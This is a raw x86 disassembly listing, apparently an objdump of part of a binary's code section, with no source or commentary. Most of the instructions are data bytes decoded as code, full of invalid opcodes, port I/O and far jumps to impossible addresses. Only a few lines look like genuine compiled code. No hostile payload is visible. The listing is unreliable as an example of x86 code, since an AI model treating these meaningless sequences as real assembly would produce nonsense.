  402885:	or     BYTE PTR [eax+edi*2],cl
  402888:	js     0x402888
  40288a:	jle    0x402904
  40288c:	js     0x4028f8
  40288e:	inc    eax
  40288f:	sbb    eax,0x468dabf4
  402894:	push   edi
  402895:	dec    edi
  402896:	inc    edx
  402897:	outs   dx,DWORD PTR ds:[esi]
  402898:	es sysenter 
  40289b:	mov    eax,ebx
  40289d:	xor    ah,BYTE PTR [eax]
  40289f:	cmp    BYTE PTR [esi],dl
  4028a1:	inc    ebp
  4028a2:	fucom  st(1)
  4028a4:	push   0xffffff95
  4028a6:	fisub  DWORD PTR [edi-0x3bd52282]
  4028ac:	xchg   esp,eax
  4028ad:	xchg   BYTE PTR [esi+0x51f67030],dl
  4028b3:	stos   DWORD PTR es:[edi],eax
  4028b4:	aad    0x13
  4028b6:	push   ebp
  4028b7:	sbb    eax,0x96daee0
  4028bc:	aad    0x9b
  4028be:	test   al,0xfd
  4028c0:	int    0xee
  4028c2:	retf   
  4028c3:	mov    al,ds:0xce616d6e
  4028c8:	stos   BYTE PTR es:[edi],al
  4028c9:	sub    al,0x2c
  4028cb:	shr    DWORD PTR [edx+0x20],1
  4028ce:	cmc    
  4028cf:	cmp    dl,dh
  4028d1:	xchg   ecx,eax
  4028d2:	sbb    dh,BYTE PTR [edi]
  4028d4:	popa   
  4028d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4028d6:	add    DWORD PTR [esi],edx
  4028d8:	(bad)  [edi-0x3f]
  4028db:	mov    dh,bl
  4028dd:	and    BYTE PTR [esi+0x559f24b6],ah
  4028e3:	add    al,0xf5
  4028e5:	arpl   WORD PTR [ebx+0x31],dx
  4028e8:	jbe    0x402949
  4028ea:	and    eax,DWORD PTR [esi+0x3c8e1cd4]
  4028f0:	sbb    al,0x8f
  4028f2:	sahf   
  4028f3:	enter  0xb4c,0x79
  4028f7:	dec    esp
  4028f8:	cmp    eax,0xeecb7fb1
  4028fd:	add    BYTE PTR [ecx+0x1eb4fe70],dh
  402903:	stos   DWORD PTR es:[edi],eax
  402904:	pop    DWORD PTR [ebx]
  402906:	jmp    0x402936
  402908:	sbb    cl,BYTE PTR [edi]
  40290a:	push   es
  40290b:	loop   0x40293d
  40290d:	int    0xbc
  40290f:	data16 mov bh,dl
  402912:	or     BYTE PTR [eax-0x34dbf99],ah
  402918:	pop    eax
  402919:	dec    eax
  40291a:	or     BYTE PTR [esi],dh
  40291c:	dec    ebx
  40291d:	ins    BYTE PTR es:[edi],dx
  40291e:	sub    edx,eax
  402920:	test   DWORD PTR [ecx],ecx
  402922:	mul    BYTE PTR [esi-0x76]
  402925:	aas    
  402926:	xor    bh,BYTE PTR [ebx+0x16]
  402929:	pusha  
  40292a:	ror    BYTE PTR [edx-0x44],cl
  40292d:	scas   al,BYTE PTR es:[edi]
  40292e:	sahf   
  40292f:	mov    esp,0xd63aceec
  402934:	sub    al,0xec
  402936:	mov    al,0x32
  402938:	mov    eax,0xa9426d4b
  40293d:	mov    bh,BYTE PTR [edi+0x7cd70551]
  402943:	sbb    al,0x81
  402945:	ror    BYTE PTR [ebx],cl
  402947:	popa   
  402948:	adc    al,BYTE PTR [edi+0x334770f]
  40294e:	pop    eax
  40294f:	inc    edi
  402950:	xchg   edx,eax
  402951:	mov    ch,0x6c
  402953:	cwde   
  402954:	fild   DWORD PTR [ebx]
  402956:	mov    BYTE PTR [esi+0x596fe5],dl
  40295c:	or     eax,0x7c7009d1
  402961:	jnp    0x402995
  402963:	push   edx
  402964:	inc    esi
  402965:	and    al,0xe9
  402967:	add    dl,BYTE PTR [esi+0x1fb3d894]
  40296d:	pop    ds
  40296e:	mov    ds:0x93121878,eax
  402973:	inc    BYTE PTR [ebx+0x6e]
  402976:	jmp    0x2f4d85ae
  40297b:	push   DWORD PTR [edx]
  40297d:	adc    eax,esp
  40297f:	ins    DWORD PTR es:[edi],dx
  402980:	in     eax,0xe9
  402982:	fdiv   QWORD PTR [edx+0x42]
  402985:	test   al,0x79
  402987:	mov    bh,0x78
  402989:	xchg   edi,eax
  40298a:	cmp    DWORD PTR [edi+ebx*1-0x56],ebp
  40298e:	cmc    
  40298f:	pushf  
  402990:	inc    ebx
  402991:	pop    eax
  402992:	dec    DWORD PTR [edx]
  402994:	mov    edx,0x7f0e02b5
  402999:	fsub   DWORD PTR [eax+0x7a3aae96]
  40299f:	pop    esp
  4029a0:	das    
  4029a1:	into   
  4029a2:	ret    
  4029a3:	stos   DWORD PTR es:[edi],eax
  4029a4:	xchg   edi,eax
  4029a5:	in     eax,0x0
  4029a7:	call   0x2ac5:0x47107983
  4029ae:	xor    eax,0xd51b9fbc
  4029b3:	mov    ebp,DWORD PTR [edi-0x7fdb13f5]
  4029b9:	or     DWORD PTR [ebp+0x77],edi
  4029bc:	sbb    dl,BYTE PTR [ecx+0x67a310ba]
  4029c2:	jbe    0x4029b2
  4029c4:	sub    dh,bh
  4029c6:	jmp    0x402970
  4029c8:	cmp    BYTE PTR [ecx],ah
  4029ca:	cmp    al,0xc
  4029cc:	sub    BYTE PTR [ecx+0x7f],ch
  4029cf:	ins    BYTE PTR es:[edi],dx
  4029d0:	cmc    
  4029d1:	enter  0xd435,0x25
  4029d5:	mov    esi,0x5f8bd3ce
  4029da:	enter  0x6452,0xd
  4029de:	(bad)  
  4029df:	data16 (bad) 
  4029e1:	xor    edi,esp
  4029e3:	ja     0x4029a4
  4029e5:	dec    edx
  4029e6:	jmp    0x7127:0x284f8402
  4029ed:	cmp    ebx,esi
  4029ef:	in     al,dx
  4029f0:	inc    esp
  4029f1:	mov    ah,al
  4029f3:	pop    ebx
  4029f4:	call   0x4ebf:0x9b8b4845
  4029fb:	ret    
  4029fc:	jmp    0x402a57
  4029fe:	push   esp
  4029ff:	mov    WORD PTR [ebx-0xb9337d4],fs
  402a05:	add    ebp,DWORD PTR [ecx]
  402a07:	jnp    0x402a35
  402a09:	lahf   
  402a0a:	ins    DWORD PTR es:[di],dx
  402a0c:	hlt    
  402a0d:	jmp    0xb7f502ff
  402a12:	sbb    ah,BYTE PTR [esp+ebx*1]
  402a15:	add    DWORD PTR [ebx+esi*8-0x2f],0xffffff8c
  402a1a:	mov    DWORD PTR [edx],ebx
  402a1c:	es loopne 0x402a03
  402a1f:	xor    BYTE PTR [ebp+0x34bc4ce5],bh
  402a25:	push   0x9291728e
  402a2a:	add    cl,dl
  402a2c:	imul   edx,DWORD PTR [edi],0xc4123449
  402a32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a33:	sbb    al,BYTE PTR [edi-0x12]
  402a36:	push   es
  402a37:	mov    eax,fs
  402a39:	lods   al,BYTE PTR ds:[esi]
  402a3a:	dec    ecx
  402a3b:	mov    ebp,0x5c2a20f1
  402a40:	mov    bl,0xd
  402a42:	xlat   BYTE PTR ds:[ebx]
  402a43:	xchg   BYTE PTR [edi],al
  402a45:	adc    eax,0xffffffed
  402a48:	push   ebx
  402a49:	push   ecx
  402a4a:	and    eax,0x32830e35
  402a4f:	mov    WORD PTR [ecx-0x7add52a3],fs
  402a55:	add    bl,dl
  402a57:	inc    ebx
  402a58:	jnp    0x402a85
  402a5a:	mov    esi,0xd1cbe3e1
  402a5f:	mov    bh,0x39
  402a61:	call   0xf4116904
  402a66:	cwde   
  402a67:	(bad)  
  402a68:	ja     0x402a04
  402a6a:	xor    bh,al
  402a6c:	daa    
  402a6d:	sub    DWORD PTR [ebp-0x3a],eax
  402a70:	in     eax,0x50
  402a72:	sbb    ebx,ebx
  402a74:	dec    ebx
  402a75:	push   eax
  402a76:	pop    edi
  402a77:	or     al,0x31
  402a79:	pop    eax
  402a7a:	fwait
  402a7b:	mov    ?,WORD PTR [ecx-0x4e]
  402a7e:	out    dx,al
  402a7f:	daa    
  402a80:	push   es
  402a81:	mov    ebp,gs
  402a83:	mov    ds,ecx
  402a85:	jnp    0x402a3a
  402a87:	add    eax,0x5bbf985a
  402a8c:	clc    
  402a8d:	xlat   BYTE PTR ds:[ebx]
  402a8e:	dec    esp
  402a8f:	xor    BYTE PTR [eax-0x47d11f82],ah
  402a95:	xchg   edi,eax
  402a96:	push   edx
  402a97:	cmc    
  402a98:	mov    dh,ah
  402a9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a9b:	clc    
  402a9c:	ja     0x402aa8
  402a9e:	xor    al,0xee
  402aa0:	mov    ds:0xc0473cd1,eax
  402aa5:	add    al,0x78
  402aa7:	jae    0x402ae5
  402aa9:	mov    dh,0x3e
  402aab:	add    ecx,DWORD PTR [ecx+0x27]
  402aae:	inc    ecx
  402aaf:	stc    
  402ab0:	jbe    0x402a7d
  402ab2:	push   ss
  402ab3:	pop    edx
  402ab4:	jp     0x402ae2
  402ab6:	cdq    
  402ab7:	xor    esi,DWORD PTR [esp+ebx*2-0x13]
  402abb:	into   
  402abc:	out    dx,eax
  402abd:	adc    cl,bh
  402abf:	sbb    dh,BYTE PTR [edx+0x3c]
  402ac2:	outs   dx,BYTE PTR ds:[esi]
  402ac3:	jp     0x402aa5
  402ac5:	jmp    0x3025b545
  402aca:	inc    ebx
  402acb:	lahf   
  402acc:	jl     0x402b1a
  402ace:	lods   al,BYTE PTR ds:[esi]
  402acf:	ret    
  402ad0:	push   esp
  402ad1:	mov    ch,0xc9
  402ad3:	out    0x5a,eax
  402ad5:	test   eax,0xad50ff1e
  402ada:	test   cl,bh
  402adc:	mov    fs,WORD PTR [ecx]
  402ade:	xor    dl,BYTE PTR [eax-0x6]
  402ae1:	mov    esp,DWORD PTR [edx+edi*8+0x71474858]
  402ae8:	mov    WORD PTR [esi-0x50c412f1],cs
  402aee:	pop    ebx
  402aef:	test   dl,ch
  402af1:	repnz xchg edi,eax
  402af3:	pop    ecx
  402af4:	mov    ds:0xff96b7c0,eax
  402af9:	clc    
  402afa:	pop    ss
  402afb:	fimul  WORD PTR [ecx-0x24]
  402afe:	jne    0x402b7b
  402b00:	ds into 
  402b02:	sub    bh,BYTE PTR [edi]
  402b04:	fwait
  402b05:	test   eax,0x364b2523
  402b0a:	(bad)  
  402b0b:	mov    dl,0x16
  402b0d:	jmp    0xea085632
  402b12:	call   0xc2c8:0xc0000002
  402b19:	int    0xda
  402b1b:	rcr    ebx,1
  402b1d:	aad    0x7b
  402b1f:	bound  ebp,QWORD PTR [esi+0x37]
  402b22:	xor    cl,dh
  402b24:	imul   ebx,DWORD PTR [esi+ecx*4],0x12
  402b28:	js     0x402ba2
  402b2a:	(bad)  
  402b2b:	jle    0x402ba5
  402b2d:	js     0x402b36
  402b2f:	mov    eax,ds:0x278d64fe
  402b34:	push   0xe98aadec
  402b39:	xor    al,0xbd
  402b3b:	fld    QWORD PTR [edi+esi*2]
  402b3e:	adc    esp,eax
  402b40:	arpl   WORD PTR [ecx+edi*1],cx
  402b43:	inc    eax
  402b44:	fs test eax,0xbae2ca58
  402b4a:	dec    esp
  402b4b:	push   es
  402b4c:	xlat   BYTE PTR ds:[ebx]
  402b4d:	push   esp
  402b4e:	punpckhwd mm0,QWORD PTR [ebp-0x1e]
  402b52:	mov    ah,0xd8
  402b54:	push   edx
  402b55:	pop    es
  402b56:	loop   0x402b08
  402b58:	fs loope 0x402b88
  402b5b:	pop    edx
  402b5c:	and    eax,0x94fb0050
  402b61:	pop    edx
  402b62:	out    0x14,eax
  402b64:	mov    eax,ds:0x8d1360f4
  402b69:	fisubr WORD PTR [eax]
  402b6b:	test   BYTE PTR [esi-0x1b],0xea
  402b6f:	fnsave [edx]
  402b71:	xchg   edi,ebx
  402b73:	sbb    DWORD PTR [ecx],edx
  402b75:	or     dh,ch
  402b77:	mov    edx,0x7741f54e
  402b7c:	lods   al,BYTE PTR ds:[esi]
  402b7d:	loopne 0x402be6
  402b7f:	fwait
  402b80:	xchg   dh,bl
  402b82:	dec    ecx
  402b83:	inc    edi
  402b84:	(bad)  
  402b85:	(bad)  
  402b86:	xchg   edi,eax
  402b87:	add    ebx,DWORD PTR [edi+0x53]
  402b8a:	outs   dx,BYTE PTR ds:[esi]
  402b8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b8c:	ds push edx
  402b8e:	xor    DWORD PTR [edx],edi
  402b90:	cmp    DWORD PTR [edi],ebx
  402b92:	pusha  
  402b93:	es push es
  402b95:	sbb    cl,BYTE PTR [ebx+0x5aa7ba8b]
  402b9b:	mov    eax,es:0xd1601896
  402ba1:	mov    cl,0x62
  402ba3:	add    ecx,edi
  402ba5:	stos   BYTE PTR es:[edi],al
  402ba6:	cli    
  402ba7:	push   eax
  402ba8:	js     0x402bf5
  402baa:	pop    ebp
  402bab:	mov    esi,0xa537bd86
  402bb0:	out    dx,eax
  402bb1:	sub    al,0xb6
  402bb3:	cmc    
  402bb4:	jnp    0x402b3e
  402bb6:	outs   dx,DWORD PTR ss:[esi]
  402bb8:	frstor [edi-0x63554c1a]
  402bbe:	inc    eax
  402bbf:	jne    0x402bcf
  402bc1:	mov    ss,WORD PTR [edi-0x44]
  402bc4:	push   ecx
  402bc5:	rcl    BYTE PTR [eax+0x9],cl
  402bc8:	push   cs
  402bc9:	fsubp  st(2),st
  402bcb:	push   es
  402bcc:	test   eax,0x3bcea44b
  402bd1:	and    DWORD PTR [edx+edx*1],esp
  402bd4:	je     0x402b6d
  402bd6:	mov    edx,edi
  402bd8:	in     eax,dx
  402bd9:	adc    bh,bh
  402bdb:	cwde   
  402bdc:	shr    BYTE PTR ds:0x31f4e676,0xa1
  402be3:	and    al,0x93
  402be5:	in     al,0x1
  402be7:	sub    ecx,DWORD PTR [edx+0x433ccfb9]
  402bed:	jmp    0x83f4389a
  402bf2:	and    dh,0xf3
  402bf5:	or     BYTE PTR [edi+0x54af7074],0xf8
  402bfc:	out    0x87,al
  402bfe:	mov    ah,0xf4
  402c00:	fidiv  WORD PTR [eax]
  402c02:	add    eax,0xf8299847
  402c07:	aam    0x69
  402c09:	jmp    0xd636adfd
  402c0e:	jb     0x402bb0
  402c10:	call   0x6873dd1f
  402c15:	cmp    DWORD PTR [esi+0x5c],ebx
  402c18:	ja     0x402bae
  402c1a:	pop    esp
  402c1b:	das    
  402c1c:	and    al,0x8b
  402c1e:	int3   
  402c1f:	cmc    
  402c20:	shl    BYTE PTR [eax],cl
  402c22:	xchg   ebx,edx
  402c24:	loop   0x402bd5
  402c26:	leave  
  402c27:	stos   BYTE PTR es:[edi],al
  402c28:	cmp    eax,ecx
  402c2a:	pop    edi
  402c2b:	js     0x402c5f
  402c2d:	addr16 retf 0x9a7b
  402c31:	repnz push ss
  402c33:	(bad)  
  402c34:	daa    
  402c35:	nop
  402c36:	out    dx,eax
  402c37:	pop    edi
  402c38:	pop    esp
  402c39:	mov    esp,0x75c4b21b
  402c3e:	iret   
  402c3f:	cmp    dl,BYTE PTR [edi+0x5f]
  402c42:	add    bl,BYTE PTR [ebx+0x1f0d0ebc]
  402c48:	dec    edx
  402c49:	sub    DWORD PTR [ebx],edx
  402c4b:	or     eax,0x5c316836
  402c50:	ret    
  402c51:	imul   ecx,DWORD PTR [ecx],0xffffffb0
  402c54:	inc    ebx
  402c55:	ja     0x402bef
  402c57:	ss dec esp
  402c59:	adc    DWORD PTR [ebx-0x4f],esi
  402c5c:	add    bl,BYTE PTR [eax]
  402c5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c5f:	xchg   edx,eax
  402c60:	loopne 0x402c25
  402c62:	sub    al,BYTE PTR [edi-0x6cda2025]
  402c68:	fbstp  TBYTE PTR [eax-0x7e6d08a2]
  402c6e:	lea    esp,[eax]
  402c70:	xchg   edx,eax
  402c71:	cwde   
  402c72:	dec    esp
  402c73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402c74:	cmp    eax,0x7a1552ad
  402c79:	push   0xaf66617d
  402c7e:	push   es
  402c7f:	stos   DWORD PTR es:[edi],eax
  402c80:	outs   dx,DWORD PTR ds:[esi]
  402c81:	mov    esp,0x507f8d7a
  402c86:	or     ch,cl
  402c88:	ret    0x4c76
  402c8b:	into   
  402c8c:	mov    esi,0x5f573cdc
  402c91:	or     eax,0xf014f98f
  402c96:	mov    DWORD PTR [ecx+0x76f94e92],eax
  402c9c:	inc    esp
  402c9d:	sbb    dl,bl
  402c9f:	int    0xd9
  402ca1:	jge    0x402d17
  402ca3:	push   esi
  402ca4:	cmp    DWORD PTR [eax+0x0],0xfffffff6
  402ca8:	jo     0x402c5f
  402caa:	adc    BYTE PTR [edi-0x7e],bl
  402cad:	outs   dx,BYTE PTR ds:[esi]
  402cae:	inc    eax
  402caf:	mov    bl,0x6e
  402cb1:	pop    ds
  402cb2:	add    BYTE PTR [eax+0x2f0d0fa],ah
  402cb8:	fistp  WORD PTR ds:0xa1f53830
  402cbe:	and    BYTE PTR [eax],ah
  402cc0:	or     eax,0xee88140f
  402cc5:	(bad)  
  402cc6:	and    bl,BYTE PTR [esi+0x5d]
  402cc9:	cwde   
  402cca:	push   esp
  402ccb:	mov    ds:0x389e7b06,eax
  402cd0:	mov    DWORD PTR [edx+esi*4+0x9123eef],esi
  402cd7:	jns    0x402c9e
  402cd9:	push   ds
  402cda:	std    
  402cdb:	dec    edx
  402cdc:	loope  0x402cee
  402cde:	lds    eax,FWORD PTR [eax-0x40]
  402ce1:	sub    eax,0x71faea9b
  402ce6:	icebp  
  402ce7:	(bad)  
  402ce8:	enter  0xe1a0,0x2a
  402cec:	jno    0x402d4c
  402cee:	ror    BYTE PTR [esi+0x3054f160],0x8b
  402cf5:	xor    BYTE PTR [edx],al
  402cf7:	ror    esp,1
  402cf9:	mov    ecx,DWORD PTR [ebx+0x5a]
  402cfc:	out    0xcc,eax
  402cfe:	ds jmp 0x402cf3
  402d01:	add    edi,DWORD PTR [ebp-0xaaf84d9]
  402d07:	dec    edx
  402d08:	inc    edi
  402d09:	test   al,0x1c
  402d0b:	daa    
  402d0c:	sahf   
  402d0d:	(bad)  
  402d0e:	rcl    DWORD PTR [edi],1
  402d10:	pop    esi
  402d11:	mov    ?,ebx
  402d13:	retf   0x1165
  402d16:	mov    ecx,0xd17d435c
  402d1b:	mov    esi,0x9b0b8c94
  402d20:	or     cl,bh
  402d22:	repnz lds ebp,FWORD PTR [esi-0xa21d1c5]
  402d29:	adc    esp,ebp
  402d2b:	mov    ds:0xc0705359,al
  402d30:	call   0x810:0x5c61cee8
  402d37:	icebp  
  402d38:	inc    edi
  402d39:	(bad)
  402d3d:	cmc    
  402d3e:	xchg   esp,eax
  402d3f:	xor    DWORD PTR [edi+0x50a30f6f],edx
  402d45:	stc    
  402d46:	rol    eax,cl
  402d48:	sub    DWORD PTR [esi],edx
  402d4a:	mov    dl,0xbb
  402d4c:	pop    esp
  402d4d:	not    bh
  402d4f:	cdq    
  402d50:	push   eax
  402d51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d52:	xor    al,0x3c
  402d54:	xor    DWORD PTR [ebx],esp
  402d56:	ss cmp ch,dl
  402d59:	fsubr  DWORD PTR [eax-0xc]
  402d5c:	lahf   
  402d5d:	sub    eax,0xd6600354
  402d62:	pop    edx
  402d63:	scas   eax,DWORD PTR es:[edi]
  402d64:	mov    al,0xf3
  402d66:	icebp  
  402d67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d68:	pop    ebx
  402d69:	cmp    BYTE PTR ds:0x63860de2,cl
  402d6f:	lea    eax,[esi]
  402d71:	sub    dl,BYTE PTR cs:[edx+esi*1-0x1c]
  402d76:	and    eax,0x1f129d77
  402d7b:	sbb    BYTE PTR [edx+0x67a1c006],0xb8
  402d82:	ror    BYTE PTR [ecx],1
  402d84:	sbb    cl,BYTE PTR [ebp*2+0x15a1da4b]
  402d8b:	test   eax,0x1d0622f
  402d90:	adc    BYTE PTR [eax-0x44],bh
  402d93:	test   eax,0x64364cb0
  402d98:	mov    ebx,0x9c39f835
  402d9d:	jo     0x402d75
  402d9f:	test   DWORD PTR [esi],ebp
  402da1:	in     eax,dx
  402da2:	call   0xb8c49451
  402da7:	mov    dl,0xd
  402da9:	lea    edx,[ecx-0x4f4657af]
  402daf:	leave  
  402db0:	sub    ecx,edi
  402db2:	mov    WORD PTR [ebp-0x4],cx
  402db6:	jmp    0x402dc8
  402dbb:	xor    eax,esi
  402dbd:	lea    eax,[eax+ecx*1+0x327298]
  402dc4:	mov    WORD PTR [ebp-0x4],ax
  402dc8:	mov    eax,DWORD PTR [ebp-0xc]
  402dcb:	cmp    eax,ebx
  402dcd:	je     0x403080
  402dd3:	mov    eax,DWORD PTR [ebp-0x8]
  402dd6:	mov    DWORD PTR [eax],0x60341eb0
  402ddc:	jmp    0x404380
  402de1:	jmp    0x403080
  402de6:	(bad)  
  402de7:	leave  
  402de8:	(bad)  
  402de9:	vpsubusw xmm2,xmm4,xmm5
  402ded:	leave  
  402dee:	repnz int 0x29
  402df1:	cld    
  402df2:	stos   BYTE PTR es:[edi],al
  402df3:	jae    0x402db5
  402df5:	push   ecx
  402df6:	or     al,0x17
  402df8:	js     0x402e72
  402dfa:	(bad)  
  402dfb:	jle    0x402e75
  402dfd:	js     0x402dea
  402dff:	pop    ebx
  402e00:	ds aad 0x8f
  402e03:	push   esp
  402e04:	pop    edx
  402e05:	stos   BYTE PTR es:[edi],al
  402e06:	aas    
  402e07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e08:	pop    edi
  402e09:	fist   DWORD PTR [ecx*8-0x59dab9d1]
  402e10:	rol    BYTE PTR [esi],0xa8
  402e13:	inc    esp
  402e14:	out    0x7f,eax
  402e16:	sar    ebx,0xc9
  402e19:	pushf  
  402e1a:	xor    al,0x76
  402e1c:	aam    0xb6
  402e1e:	and    al,0xc
  402e20:	mov    edi,0x9d7f50a4
  402e25:	mov    eax,0x4375b6f
  402e2a:	inc    ebx
  402e2b:	fbld   TBYTE PTR [eax]
  402e2d:	sub    al,0x8c
  402e2f:	xchg   BYTE PTR [edx-0x5],ah
  402e32:	sub    dl,BYTE PTR [esi+0x521f1056]
  402e38:	pushf  
  402e39:	jnp    0x402e00
  402e3b:	cmp    BYTE PTR [ecx-0x61],al
  402e3e:	pusha  
  402e3f:	push   ebp
  402e40:	mov    dl,0xd4
  402e42:	cmp    ebx,DWORD PTR [eax-0x81fbbf0]
  402e48:	pop    ds
  402e49:	inc    ecx
  402e4a:	cmc    
  402e4b:	and    eax,0xbbc28c0e
  402e50:	lods   eax,DWORD PTR cs:[esi]
  402e52:	dec    ecx
  402e53:	movd   mm1,DWORD PTR [ebp-0xc]
  402e57:	sub    dl,BYTE PTR [ecx+0x20fec4f7]
  402e5d:	sti    
  402e5e:	push   ebx
  402e5f:	scas   eax,DWORD PTR es:[edi]
  402e60:	jecxz  0x402e23
  402e62:	cs (bad) 
  402e64:	jb     0x402e65
  402e66:	xchg   ecx,eax
  402e67:	jecxz  0x402ea0
  402e69:	in     eax,0xa2
  402e6b:	add    eax,0xcde6b644
  402e70:	ins    DWORD PTR es:[edi],dx
  402e71:	adc    eax,0x2b50674f
  402e76:	out    dx,al
  402e77:	xchg   ebx,eax
  402e78:	lock jno 0x402e02
  402e7b:	xchg   ebp,eax
  402e7c:	jp     0x402e44
  402e7e:	into   
  402e7f:	add    al,0xb3
  402e81:	out    0x5b,eax
  402e83:	into   
  402e84:	xor    al,0xfd
  402e86:	mov    bl,0x90
  402e88:	(bad)  
  402e89:	xlat   BYTE PTR ds:[ebx]
  402e8a:	stos   DWORD PTR es:[edi],eax
  402e8b:	pop    esi
  402e8c:	lea    edx,[esi-0x60]
  402e8f:	les    esp,FWORD PTR [ecx+eax*1+0x34]
  402e93:	push   esi
  402e94:	cld    
  402e95:	js     0x402e98
  402e97:	xor    eax,0x933b2356
  402e9c:	ret    0xbcde
  402e9f:	fadd   st,st(5)
  402ea1:	jns    0x402eed
  402ea3:	adc    esi,DWORD PTR [esp+eiz*8-0x10]
  402ea7:	xor    cl,BYTE PTR [esp+ebx*4-0x742f283]
  402eae:	adc    dl,bl
  402eb0:	sbb    BYTE PTR [esi],dh
  402eb2:	repnz or al,0x40
  402eb5:	mov    dl,0x33
  402eb7:	pop    edi
  402eb8:	inc    edx
  402eb9:	push   esp
  402eba:	adc    BYTE PTR [esi],bh
  402ebc:	les    ebx,FWORD PTR [ecx+edi*4-0x3f85cc35]
  402ec3:	jo     0x402e82
  402ec5:	mov    al,0xc
  402ec7:	mov    ds:0xb30a105b,eax
  402ecc:	jg     0x402ed5
  402ece:	mov    ch,0xf
  402ed0:	push   edx
  402ed1:	int    0x1b
  402ed3:	ds and al,0x67
  402ed6:	pop    ecx
  402ed7:	imul   ecx,DWORD PTR [ecx-0x4],0x57686399
  402ede:	shr    BYTE PTR [ecx-0x7845278e],1
  402ee4:	(bad)
  402ee8:	out    0x83,eax
  402eea:	pop    ss
  402eeb:	pop    ds
  402eec:	js     0x402f5d
  402eee:	mov    ch,BYTE PTR [esi]
  402ef0:	pusha  
  402ef1:	mov    ds:0x739670f4,al
  402ef6:	dec    ecx
  402ef7:	lods   eax,DWORD PTR ds:[esi]
  402ef8:	jmp    0x901b:0x6c3b034c
  402eff:	push   ebx
  402f00:	xchg   edi,eax
  402f01:	jbe    0x402f15
  402f03:	mov    edi,0xce562fe5
  402f08:	jmp    esp
  402f0a:	(bad)  
  402f0b:	(bad)  
  402f0c:	fimul  DWORD PTR [ebp-0xa]
  402f0f:	(bad)  
  402f11:	imul   esi,DWORD PTR [eax-0x71672ea7],0x64
  402f18:	(bad)  
  402f19:	add    ch,dh
  402f1b:	sub    al,0xb5
  402f1d:	gs or  cl,0xac
  402f21:	pop    ds
  402f22:	push   ebp
  402f23:	mul    DWORD PTR [edx]
  402f25:	cmp    DWORD PTR ds:[eax],edx
  402f28:	sub    bh,BYTE PTR [ebp+0x771dac0f]
  402f2e:	and    eax,0x613415de
  402f33:	pop    edi
  402f34:	repnz xchg edi,eax
  402f36:	fld    DWORD PTR [eax]
  402f38:	adc    bh,BYTE PTR [edx+edi*4]
  402f3b:	pop    edx
  402f3c:	inc    ebp
  402f3d:	add    edi,DWORD PTR [edx+eiz*1]
  402f40:	stos   DWORD PTR es:[edi],eax
  402f41:	repnz lods eax,DWORD PTR ds:[esi]
  402f43:	dec    edx
  402f44:	jmp    0x402f0e
  402f46:	rcr    BYTE PTR [esi],1
  402f48:	adc    al,0x72
  402f4a:	repz es xchg edi,eax
  402f4d:	data16 fwait
  402f4f:	xor    eax,0x2058e101
  402f54:	rcl    ah,0xfb
  402f57:	mov    al,ds:0x65a28bc5
  402f5c:	retf   0xdccc
  402f5f:	pop    esp
  402f60:	in     eax,dx
  402f61:	push   0xea462628
  402f66:	fcom   DWORD PTR es:[esi]
  402f69:	jae    0x402ef5
  402f6b:	dec    ebx
  402f6c:	xor    al,0x4e
  402f6e:	mov    fs,WORD PTR [ecx]
  402f70:	sub    BYTE PTR [eax+0x68],al
  402f73:	push   0x5ee3a399
  402f78:	sbb    DWORD PTR [eax+eax*4+0x43],esp
  402f7c:	mov    ds:0x688cf943,al
  402f81:	xor    DWORD PTR [ebp+0x1],edi
  402f84:	inc    ebp
  402f86:	mov    ecx,0x95bae8c4
  402f8b:	jmp    0xa6b1:0x9573d5e1
  402f92:	push   ecx
  402f93:	fdiv   QWORD PTR [ecx]
  402f95:	stos   DWORD PTR es:[edi],eax
  402f96:	(bad)  
  402f97:	push   cs
  402f98:	dec    esi
  402f99:	les    ebx,FWORD PTR [ebx+0x2b]
  402f9c:	mov    edi,0x3273c765
  402fa1:	jae    0x402fcb
  402fa3:	sbb    edi,ebx
  402fa5:	lods   eax,DWORD PTR ds:[esi]
  402fa6:	dec    eax
  402fa7:	fsubr  DWORD PTR [ebx-0x60c60794]
  402fad:	aas    
  402fae:	inc    esi
  402faf:	mov    gs,WORD PTR [ebx-0x27c2a88a]
  402fb5:	xor    DWORD PTR [esi],esp
  402fb7:	shr    DWORD PTR [edi-0x31],1
  402fba:	inc    edi
  402fbb:	mov    ds:0x617fca4f,eax
  402fc0:	add    dl,BYTE PTR [ecx+0x457b43e3]
  402fc6:	xor    al,0xd7
  402fc8:	mov    cl,0x77
  402fca:	add    al,0xca
  402fcc:	cli    
  402fcd:	inc    esi
  402fce:	daa    
  402fcf:	jmp    0xf7a889fe
  402fd4:	aad    0xb3
  402fd6:	hlt    
  402fd7:	xchg   esp,eax
  402fd8:	xchg   ebx,eax
  402fd9:	and    al,0xf2
  402fdb:	inc    esp
  402fdc:	xchg   ebp,eax
  402fdd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402fde:	mov    ebx,0xb2c63362
  402fe3:	enter  0x8be,0x21
  402fe7:	adc    al,0x8a
  402fe9:	sbb    BYTE PTR [ebx+eiz*2-0x4a54ff10],ah
  402ff0:	or     WORD PTR [esi+ebp*2-0x1e],ax
  402ff5:	sub    bh,dh
  402ff7:	mov    ebx,0x7c66ff85
  402ffc:	out    dx,eax
  402ffd:	popf   
  402ffe:	or     al,0xe4
  403000:	inc    edi
  403001:	pushf  
  403002:	arpl   WORD PTR [ecx+0xc840196],cx
  403008:	(bad)  
  403009:	xchg   esi,eax
  40300a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40300b:	dec    ebp
  40300c:	inc    esp
  40300d:	sbb    al,0x71
  40300f:	inc    edi
  403010:	fs jno 0x403029
  403013:	hlt    
  403014:	into   
  403015:	push   edi
  403016:	inc    edi
  403017:	bound  ebp,QWORD PTR [eax]
  403019:	lods   al,BYTE PTR ds:[esi]
  40301a:	dec    ecx
  40301b:	lea    edx,[ecx]
  40301d:	mov    esi,0x2a051c6e
  403022:	aas    
  403023:	xor    al,0x3c
  403025:	xchg   edi,eax
  403026:	test   BYTE PTR [esi+edx*2],cl
